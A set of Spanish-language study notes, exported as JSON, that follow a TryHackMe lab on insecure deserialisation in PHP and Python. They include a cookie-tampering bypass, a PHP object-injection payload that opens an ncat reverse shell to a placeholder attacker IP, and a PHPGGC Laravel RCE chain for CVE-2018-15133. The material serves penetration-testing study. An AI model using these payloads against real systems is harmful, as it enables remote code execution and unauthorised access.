[
  {
    "title": "7. Automation Scripts",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/7-automation-scripts/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/7. Automation Scripts.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "Automatizar scripts durante el pentesting es esencial para identificar y explotar de manera eficiente las vulnerabilidades en aplicaciones web. En esta tarea exploraremos una herramienta llamada **PHP Gadge Chain (PHPGGC)** que juega un rol crucial en este proceso, automatizando el descubrimiento de vulnerabilidades de deserialización insegura.\n\n--------------------------------------------------\n<h2>PHP Gadget Chain (PHPGGC)</h2>\nPHPGGC es una herramienta para generar cadenas de gadget usadas en los ataques de inyección de objetos PHP, específicamente diseñados para explotar vulnerabilidades relacionadas a la serialización y deserialización de objetos PHP.\n\n<h4>Funcionalidad</h4>\n- **Gadget Chains:** PHPGGC ofrece una librería de cadenas de gadget para varios frameworks y librerías PHP. Estas cadenas de gadgets son secuencias de objetos y métodos diseñados para explotar vulnerabilidades específicas cuando una aplicación PHP deserializa de forma insegura el input del usuario.\n- **Payload Generation:** El propósito principal de PHPGGC es facilitar la generación de payloads serializados que pueden disparar estas vulnerabilidades. Ayuda a investigadores de ciberseguridad y pentesters a crear payloads que demuestren el impacto de las debilidades de deserialización.\n- **Payload Customisation:** Los usuarios pueden personalizar payloads especificando argumentos para funciones o métodos involucrados en la cadena de gadgets, dirigiendo así el ataque para conseguir resultados específicos.\n\nPuedes descargar PHPGGC desde su [repositorio de GitHub](https://github.com/ambionics/phpggc). Para listar todas las cadenas de gadgets disponibles puedes usar la opción `-l` con PHPGGC, lo que mostrará el nombre, versión tipo y vector para lanzar un ataque específico. Además, puedes filtrar cadenas de gadgets basado en sus capacidades, como aquellos que apuntan a frameworks PHP o técnicas específicos. Para hacer esto usa `-l` seguido de una palabra filtradora.\n\n```bash\nthm@machine$ php phpggc -l\n\nGadget Chains\n-------------\n\nNAME                                      VERSION                                                 TYPE                      VECTOR          I    \nBitrix/RCE1                               17.x.x <= 22.0.300                                      RCE: Command              __destruct           \nCakePHP/RCE1                              ? <= 3.9.6                                              RCE: Command              __destruct           \nCakePHP/RCE2                              ? <= 4.2.3                                              RCE: Command              __destruct           \nCodeIgniter4/FD1                          <= 4.3.6                                                File delete               __destruct           \nCodeIgniter4/FD2                          <= 4.3.7                                                File delete               __destruct           \nCodeIgniter4/FR1                          4.0.0 <= 4.3.6                                          File read                 __toString      *    \nCodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           \nCodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                     RCE: Command              __destruct           \nCodeIgniter4/RCE3                         4.0.4 <= 4.4.3                                          RCE: Command              __destruct           \nCodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                              RCE: Command              __destruct         \n```\n\nPor ejemplo, el output para `CakePHP/RCE1` significa que la cadena de gadget llamada `CakePHP/RCE1` explota una vulnerabilidad RCE en CakePHP en versiones hasta la `3.9.6`. Esta vulnerabilidad permite a los atacantes ejecutar comandos en el sercidor aprovechándose del método `__destruct`.\n\n------------------------------------------\n<h2>Explotar una Aplicación Web</h2>\nComo pentesters, nos centramos en una web para explotar una vulnerabilidad conocida identificada bajo [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133). La vulnerabilidad es disparada cuando Laravel deserializa la información no confiable del `X-XSRF-TOKEN`. El proceso de deserializacióon puede llevar a ejecutar código arbitrario en el servidor si no se maneja con cautela. Los detalles em cuando a esta vulnerabilidad pueden leerse [aquí](https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30), pero nuestro foco principal será cómo podemos utilizar las cadenas de gadgets PHP durante la explotación. La vulnerabilidad arriba mencionada puede ser explotada usando 3 factores principales:\n\n- **Paso 1:** Requiere `APP_KEY` de Laravel, el cual el framework usa para encriptar el token XSRF.\n- **Paso 2:** Usa PHPGGC para generar un payload deserializado ejecutando un comando. Esto se considera una tarea compleja por lo que hay una herramienta que nos ayuda.\n- **Paso 3:** Finalmente, debemos encriptar el payload usando `APPKEY` y mandar la petición POST. Esto normalmente varía de un framework a otro.\n\nEn esta tarea nuestro foco principal estará en el paso 2 y en entender cómo PHPGGC nos asistirá. Visita la aplicación vulnerable de Laravel en `http://IP:8089`. Podemos identificar las versiones de la aplicación mediante diferentes técnicas. La versión de este Laravel es la `5.6.29`.\n\n![[Pasted image 20260121125547.png]]\n\nAhora iremos al paso a paso detallado de la explotación.\n\n- Para el primer paso, adquiriremos `APP_KEY` mediante un vector de ataque como ingeniería social. Puedes obtenerla en este ejemplo visitando `http://IP:8089/get-key`. Además esta página te dará el primer payload que tiene el comando `whoami`.\n- Para el segundo paso tenemos que identificar el payload que podemos usar:\n\n```bash\nthm@machine$ php phpggc -l Laravel\n\nGadget Chains\n-------------\n\nNAME                  VERSION           TYPE             VECTOR    \nLaravel/RCE1          5.4.27            rce              __destruct\nLaravel/RCE2          5.5.39            rce              __destruct\nLaravel/RCE3          5.5.39            rce              __destruct\nLaravel/RCE4          5.5.39            rce              __destruct\n```\n\nPodemos generar el payload usando varios gadgets. Cada gadget tiene su relevancia y utiliza diferentes clases durante el proceso de deserialización. Usaremos RCE3 en este ejemplo y generaremos el payload usando el comando `php phpggc -b Laravel/RCE3 system whoami` para un payload base64 encodeado. Aquí abajo se muestra un payload no encodeado:\n\n```bash\nthm@machine$ php phpggc Laravel/RCE3 system whoami \nO:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"*events\";O:39:\"Illuminate\\Notifications\\ChannelManager\":3:{s:6:\"*app\";s:6:\"whoami\";s:17:\"*defaultChannel\";s:1:\"x\";s:17:\"*customCreators\";a:1:{s:1:\"x\";s:6:\"assert\";}}}\n```\n\n<h4>Desglose del Payload</h4>\n- `Illuminate\\Broadcasting\\PendingBroadcast`: Esta clase maneja eventos broadcast en Laravel. Es principalmente un vehículo para llevar el objeto malicioso anidado.\n- `Illuminate\\Notifications\\ChannelManager`: Este objeto maneja los canales de notificación. Lo manipulamos para inyectar ejecución de código arbitrario a través de sus propiedades, `*app`, la cual típicamente referenciaría el contenedor de servicio de la aplicación.Lo usamos mal intencionalmente para que acoja nuestro comando `whoami`. También manipulamos las propiedades `*defaultChannel` y `*customCreators` que están giradas para crear un escenario donde la función `assert` de PHP se llame, ejecutando el código pasado.\n\nComo ya sabemos, Laraver empleó intencionalmente cookies encriptadas y serializadas para guardar de forma segura la información de sesión y token CSRF, usando la misma metodología para ambos. Si visitamos la app vulnerable, podemos ver las cookies encriptadas y serializadas.\n\n![[Pasted image 20260121130737.png]]",
    "modified": "2026-01-22T00:56:06"
  },
  {
    "title": "5. Exploitation - Update Properties",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/5-exploitation-update-properties/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/5. Exploitation - Update Properties.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "<h2>Actualizando las Propiedades de un Objeto</h2>\nEn esta tarea exploraremos un ejemplo práctico en PHP, usando una aplicación simple de compartir notas. Nuestra aplicación permite a los usuarios crear, guardar y compartir notas fácilmente. Los usuarios pueden introducir sus notas en la aplicación que son guardadas para referencias futuras. Además, los usuarios pueden compartir sus notas con otros, facilitando la colaboración y el intercambio de información. La aplicación también incluye funcionalidades basadas en suscripción, asegurando que sólo los usuarios suscritos tengan acceso a ciertas funcionalidades como compartir las notas. Puedes acceder a la web en `http://IP/case1`.\n\n![[Pasted image 20260120134821.png]]\n\nVamos a ver cómo se ha construído la aplicación.\n\n<h4>Definiendo la Clase Notes</h4>\nLa aplicación tiene una clase `Notes`, representando una nota en nuestra aplicación. Esta clase tiene tres propiedades privadas: `user`, `role` y `isSubscribed`. También tenemos métodos setter y getter para manipular la propiedad `isubscribed`.\n\n```php\nclass Notes {\n\n    private $user;\n    private $role;\n    private $isSubscribed;\n\n    public function __construct($user, $role, $isSubscribed) {\n        $this->user = $user;\n        $this->role = $role;\n        $this->isSubscribed = $isSubscribed;\n    }\n\n    public function setIsSubscribed($isSubscribed) {\n        $this->isSubscribed = $isSubscribed;\n    }\n\n    public function getIsSubscribed() {\n        return $this->isSubscribed;\n }\n}\n```\n\n<h4>Guardando la Información de Usuario en Cookies</h4>\nCuando un usuario visita niuestra aplicación web por primera vez, configura una cookie serializada que contiene su información. Esto incluye su nombre de usuario, rol y estado de subscripción (`isSubscribed`). Si el usuario es un miembro suscripto (**isSubscribed = true**), se les permite compartir notas.\n\n![[Pasted image 20260120150357.png]]\n\n<h4>Explotando la Vulnerabilidad</h4>\nEn este paso ilustraremos cómo un atacante puede explotar la vulnerabilidad modificando la cookie serializada para ganar acceso no autorizado a compartir notas.\n\n- **Serialised cookie:** Después de decodear el valor base64 encodeado de la cookie, obtenemos la siguiente representación serializada del objeto Notes.\n\n```php\nO:5:\"Notes\":3:{s:4:\"user\";s:5:\"guest\";s:4:\"role\";s:5:\"guest\";s:12:\"isSubscribed\";b:0;}\n```\n\n- `O:5:\"Notes\":3`: Esto representa un objeto (O) con la clase Notes, la cual tiene 3 propiedades.\n- `s:4:\"user\";s:5:\"guest\"`: Esto indica una string (s) con una longitud de 4 caracteres representando a la propiedad `user` con el valor \"guest\".\n- `s:4:\"role\";s:5:\"guest\"`: Esto similar al de arriba indica que la propiedad `role` tiene el valor \"guest\".\n- `s:12:\"isSubscribed\";b:0`: Representa un booleano (b) llamado `isSubscribed` con el valor falso (0).\n\n---------------------------------------------\n<h2>Explotando la Vulnerabilidad</h2>\nEl el escenario actual, cuando el usuario intenta compartir una nota, le sale el siguiente pop-up:\n\n![[Pasted image 20260120151116.png]]\n\nY bien, ¿qué está pasando en el backend? El código PHP del backend valida la cookie entrante, la deserializa, y luego valida si el usuario está o no suscrito. Nuestra tarea principal es bypassear eso.\n\nSupón que un atacante intercepta esta cookie serializada y modifica el valor de la propiedad `isSubscribed` de falso (0) a verdadero (1). El atacante puede manipular el estado de suscripción sin autorización legítima cambiando el valor booleano en la información serializada.\n\n![[Pasted image 20260120151337.png]]\n\nDespués de modificarlo, el atacante vuelve a base64 encodearlo y listo.",
    "modified": "2026-01-21T00:56:33"
  },
  {
    "title": "3. Serialisation Formats",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/3-serialisation-formats/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/3. Serialisation Formats.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "Aunque diferentes lenguajes de programación usan diferentes palabras clave y funciones para la serialización, el principio subyaciente permanece constante. La serialización es el proceso de convertir el estado de un objeto a un formato que pueda ser fácilmente almacenado o transmitido y luego reconstruído.\n\nAl contrario que otras vulnerabilidades comunes que explotan el procesamiento inmediato de los inputs del usuario, los problemas de deserialización insegura involucran una interacción más profunda con la lógica principal de la aplicación.\n\nExploremos cómo se maneja explícitamente la serialización en diferentes lenguaje, junto a su funcionalidad, sintaxis y cualidades particulares.\n\n---------------------------------------\n<h2>Serialización PHP</h2>\nEn PHP, la serialización se consigue usando la función `serialize()`. Esta convierte un objeto o array de PHP a un stream de bytes representando la información y estructura del objeto. El byte stream resultante puede incluir varios tipos de datos, como strings, arrays y objetos. Para ilustrarlo, consideremos una aplicación de notas donde los usuarios pueden guardar y recuperar sus notas. Crearemos una clase PHP llamada **Notes** para representar cada nota y manejar la serialización y deserialización.\n\n```php\nclass Notes {\n    public $Notescontent;\n\n    public function __construct($content) {\n        $this->Notescontent = $content;\n    }\n}\n```\n\nEn nuestra aplicación Notes, cuando un usuario guarda una nota, la serializamos usando `serialize()`. Esto convierte el objeto en una representación de string que puede ser guardada en un archivo o base de datos. Echemos un vistazo al siguiente trozo de código que serializa los objetos de la clase Notes.\n\n```php\n$note = new Notes(\"Welcome to THM\");\n$serialized_note = serialize($note);\n```\n\nEntramos en `http://IP/phptest/` e introducimos cualquier string para serializazr o deserializar. Por ejemplo, si introduces la string **Welcome to THM**, generará el output: `O:5:\"Notes\":1:{s:7:\"content\";s:14:\"Welcome to THM\";}`.\n\n![[Pasted image 20260120100215.png]]\n\nVamos a decodear el output:\n\n- `O:5:\"Notes\":1:`: Esta parte indica que la información serializada erpresenta un objeto de la clase Notes,  que tiene una propiedad.\n- `s:7:\"content\"`: Esto representa la propiedad llamada \"**content**\" con una longitud de 7 caracteres. En información serializada, las strings se representan con `s` seguido de la longitud  de la string y la string entre comillas. Los enteros se representan con una `i` seguido del valor numérico sin comillas.\n- `s:14:\"Welcome to THM\"`: Este es el valor de la propiedad **content** con una longitud de 14 caracteres.\n\n----------------------------------------\n<h2>Métodos Mágicos</h2>\nPHP ofrece varios [métodos mágicos](https://www.php.net/manual/en/language.oop5.magic.php) que juegan varios roles en el proceso de serialización. Algunos de estos métodos importantes se mencionan debajo:\n\n- `___sleep()`: Este método se llama en un objeto antes de la serialización. Limpia recursos, como conexiones a bases de datos y se espera que devuelva un array de nombres de propiedades que deberían ser serializadas.\n- `__wakeup()`: Este método es llamado al deserializar. Puede restablecer cualquier conexión que el objeto pueda necesitar para operar correctamente.\n- `__serialize()`: En PHP 7.4 este método permite personalizar la información de serializazción devolviendo un array representando la forma serializada del objeto.\n- `__unserialize()`: Es la contraparte de `__serialize()` y permite personalizar la restauración de un objeto desde su información serializada.\n\n--------------------------------------------------\n<h2>Python</h2>\nPython usa un módulo llamado **Pickle** para serializar y deserializar objetos. Este módulo convierte un objeto Python en un byte stram (y viceversa), permitiendo que sea guardado en un archivo o transmitido a través de la red. Maneja casi todos los tipos de objetos Python sin intervención manual. Seguiremos el mismo ejemplo de Notes de PHP con Python con `app.py`:\n\n```python\nimport pickle\nimport base64\n\n...\nserialized_data = request.form['serialized_data']\nnotes_obj = pickle.loads(base64.b64decode(serialized_data))\nmessage = \"Notes successfully unpickled.\"\n...\n\nelif request.method == 'POST':\n    if 'pickle' in request.form:\n        content = request.form['note_content']\n        notes_obj.add_note(content)\n        pickled_content = pickle.dumps(notes_obj)\n        serialized_data = base64.b64encode(pickled_content).decode('utf-8')\n        binary_data = ' '.join(f'{x:02x}' for x in pickled_content)\n        message = \"Notes pickled successfully.\"\n```\n\n<h4>Pickling Process</h4>\n- **Creando la clase Notes:** Esta clase maneja una lista de notas. Ofrece métodos para añadir una nota y recuperar todas, haciendo fácil manejar el estado de la aplicación.\n- **Serialización (Pickling):** Cuando un usuario sube una nota, la instancia de clase Notes se serializa (todas las notas) usando `pickle.dumps()`. Esta función transforma el objeto Python en formato binario que puede reconvertirse más adelante.\n\n<h4>Mostrando la Información Serializada (Base64 Encoding)</h4>\n- **Por qué usar base64:** La información serializazda es binaria y no segura de mostrar en todos los entornos. La información binaria puede contener bytes que pueden interferir con protocolos de comunicación (como HTTP). Base64 es un esquema de encodeado que convierte información binaria en texto plano. Sólo usa caracteres legibles haciéndolo seguro de transmitir por canales que no soportan información binaria.\n- **Proceso de Encoding:** Después de serializar el objeto `Notes`, la información binaria se encodea en base64 usando `base64.b643ncode()`. Esta string es segura de mostrar en HTML y fácil de guardar o transmitir.\n\n<h4>Deserialización</h4>\n- **Base64 decoding:** Al hacer unpickling, la string base64 se decodea de vuelta a un formato binario usando `base64.b64deconde()`.\n- **Unpickling:** Los datos binarios se pasan a `pickle.loads()` lo que reconstruye el objeto original de Python del binary stream.\n\nDe nuevo, si visitamos el link `http://IP:5000` e introducimos la string **Welcome to THM**:\n\n![[Pasted image 20260120122602.png]]\n\n- **Pickling:** Cuando la string se picklea se convierte en formato binario que no es legible por humanos.\n- **Base64 encoding:** El binario se encodea en Base64.\n\nEn Java la serialización de objetos la lleva a cabo `Serializable`. Para .NET, inicialmente fue `BinaryFormatter` y ahora `System.Text.Json` para serializaciones JSON o `System.Xml.Serialization` para tareas XML. Ruby ofrece simplicidad con su módulo `Marshal`.",
    "modified": "2026-01-21T00:56:33"
  },
  {
    "title": "4. Identification",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/4-identification/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/4. Identification.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "Después de un entendimiento completo de la serialización a lo largo de diferentes lenguajes de programación, transicionaremos ahora a un aspecto crítico de la ciberseguridad, explotando y mitigando vulnerabilidades relacionadas a la serialización. Antes de ver las técnicas de explotación es necesario aprender a identificar estas vulnerabilidades en las aplicaciones, ya tengamos acceso al código o no.\n\n--------------------------------------\n<h2>Acceso al Código Fuente</h2>\nCuando tenemos acceso al código fuente, identificar las vulnerabilidades de serialización puede ser más directo, pero requiere un buen entendimiento de dónde y qué buscar. Por ejemplo en busca de funciones como `serialize()`, `unserialize()` o `pickle.loads()`. Debemos prestar especial atención a cualquier punto donde el input del usuario sea pasado directamente a estas funciones.\n\n---------------------------------------------\n<h2>Sin Acceso al Código Fuente</h2>\nAl auditar una aplicación sin acceso al código fuente, el reto recae en deducir cómo se procesa la información basado en observaciones e interacciones externas. Esto es comúnmente conocido como **black-box testing**. Una técnica bastante usada para intentar acceder a backups o archivos temporales creados por editores de texto es añadir `~` al final de un archivo PHP.\n\n<h4>Analizando Respuestas del Servidor</h4>\n- **Mensajes de error:** Ciertos mensajes de error pueden indicar indirectamente problemas con las serialización. Por ejemplo, PHP puede que mande errores o avisos que contengan frases como `unserialize()` u **Object deserialisation error** que revela procesos de serialización y puntos de vulnerabilidad potenciales.\n- **Inconsistencias en el comportamiento de la aplicación:** Desde comportamiento inesperado en la respuesta hasta input manipulado, pueden sugerir problemas con cómo se deserializa y maneja la información. Observar cómo maneja información serializada alterada la aplicación  puede ofrecer pistas sobre código potencialmente vulnerable.\n\n<h4>Examinando Cookies</h4>\nLas cookies se suelen usar para guardar información serializada en aplicaciones web. Examinando los contenidos de la cookie podemos soler inferir:\n\n- **Valores base64 encodeados en cookies (PHP y .NET):** Si las cookies contienen información que se ve como base64 encoded, decodearla puede revelar objetors o estructuras de datos serializazdos. PHP suele usar serialización para manejo de sesiones y guardar variables de sesión en formato serializado.\n- **View State ASP.NET:** Las aplicaciones .NET puede que usen la serialización en el view state mandado al navegador del cliente. Un campo llamado `__VIEWSTATE`, que está base64 encodeado, puede verse a veces. Decodearlo y examinarlo puede revelar si contiene datos serializados potencialmente explotables.",
    "modified": "2026-01-21T00:56:33"
  },
  {
    "title": "6. Exploitation - Object Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/6-exploitation-object-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/6. Exploitation - Object Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "La inyección de objetos es una vulnerabilidad que surge de la deserialización de información insegura en las aplicaciones web. Ocurre cuando datos no confiables se deserializan en un objeto, permitiendo a los atacantes manipular la información serializada para ejecutar código arbitrario.\n\nPara explotar una vulnerabilidad de inyección de objetos PHP, la aplicación debería incluir una clase con un método mágico de PHP. como `__wakeup` o `__sleep` que pueden ser explotados. Todas las clases involucradas en el ataque deberían ser declaradas antes de llamar al método `serialize()` ( a no ser que el object autoloading esté habilitado).\n\n<h4>Ejemplo</h4>\nConsideremos un trozo de código `index.php` que muestra la serialización y deserialización usando el `serialize()` y `unserialize()`. El código acepta el parámetro GET decode o encode y convierte el input del usuario en concordancia.\n\n```php\n<?php\nclass UserData {\n    private $data;\n    public function __construct($data) {\n        $this->data = $data;\n    }\n..\nrequire 'test.php';\nif(isset($_GET['encode'])) {\n    $userData = new UserData($_GET['encode']);\n    $serializedData = serialize($userData);\n    $base64EncodedData = base64_encode($serializedData);\n    echo \"Normal Data: \" . $_GET['encode'] . \"<br>\";\n    echo \"Serialized Data: \" . $serializedData . \"<br>\";\n    echo \"Base64 Encoded Data: \" . $base64EncodedData;\n\n} elseif(isset($_GET['decode'])) {\n    $base64EncodedData = $_GET['decode'];\n    $serializedData = base64_decode($base64EncodedData);\n    $test = unserialize($serializedData);\n    echo \"Base64 Encoded Serialized Data: \" . $base64EncodedData . \"<br>\";\n    echo \"Serialized Data: \" . $serializedData;\n\n...\n```\n\nPor ejemplo, si mandamos el input **hellothm** vía la URL `http://IP/case2/?encode=hellothm`, obtendremos el siguiente output:\n\n![[Pasted image 20260120152934.png]]\n\nVemos que el código incluye un archivo llamado `test.php`. Desde una revisión de código, considerando si el framework es opensource, el pentester sabe que `test.php` contiene una clase llamada `MaliciousUserData` como se muestra:\n\n```php\n<?php\nclass MaliciousUserData {\npublic $command = 'ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh'; // call to troubleshooting server\n    \n    public function __wakeup() { \n    exec($this->command);\n...\n\n?>\n```\n\nEn el código de arriba, aunque hay deserialización insegura, es posible manipular las propiedades de un objeto, incluyendo alterar la propiedad `command` de la clase `MaliciousUserData` en el código de arriba. Esto puede conseguirse construyendo una string serializada específica que contenga los valores de propiedades deseados. Por ejemplo, si queremos modificar la propiedad `command` para ejecutar un comando diferente, podemos serializar un objeto con el valor de propiedad deseado e inyectarlo en la función vulnerable `unserialize()`. De esta forma al ser deserializado la propiedad modificada será cargada en el objeto.\n\nEs importante entender que durante la deserializaión insegura no puedes actualizar directamente la definición del método `__wakeup` en sí mismo. Es parte de la definición de clase y se mantiene estático durante el proceso de deserialización. Sin embargo, puedes modificar el comportamiento o propiedades del objeto en el método `__wakeup`. Esto significa que mientras que la definición del método se mantiene constante, sus acciones al deserializarse pierden ser manipuladas.\n\n-----------------------------------------------------\n<h2>Preparando el Payload</h2>\nComo ya hemos visto, llamar a otra clase es una funcionalidad normal de PHP, y puedes ver el código de ese archivo si la página está usando código abierto. El código en `index.php` deserializa el input sin realizar ninguna sanitización. ¿Qué pasa si cambiamos la clase `MaliciousUserData` y modificamos el atributo `command` para que cuando se llame a la función `__wakeup` sea llamada con el valor del atacante?\n\nVamos a crear código PHP que genere información serializada maliciosa.\n\n```php\n<?php\nclass MaliciousUserData {\npublic $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';\n}\n\n$maliciousUserData = new MaliciousUserData();\n$serializedData = serialize($maliciousUserData);\n$base64EncodedData = base64_encode($serializedData);\necho \"Base64 Encoded Serialized Data: \" . $base64EncodedData;\n?>\n```\n\n- En el código de arriba, la función `_wakeup()` de la clase `MaliciousUserData` (`test.php`) ejecutara una reverse shell usando `ncat` para conectarse a la `ATTACK_IP` por el puerto `4444` con la flag `-e` para ejecutar `/bin/sh` como una shell.\n- Una vez creado el archivo, ejecútalo con `php index.php`. Esto devolverá un objeto serializado en base64 de la clase `MaliciousUserData`.\n- La string encodeada en base 64 generada se vera como: `TzoxNzoiTWFsaWNp[Redacted]`.\n- Empezamos el listener usando `nc -nvlp 4444`.\n- Ahora explotamos la deserialización insegura yendo a `http://10.64.169.42/case2/?decode=[SHELLCODE]`.\n- Una vez que visitemos la URL, la string se deserializan  y ejecuta la función `__wakeup()`.",
    "modified": "2026-01-21T00:56:33"
  }
]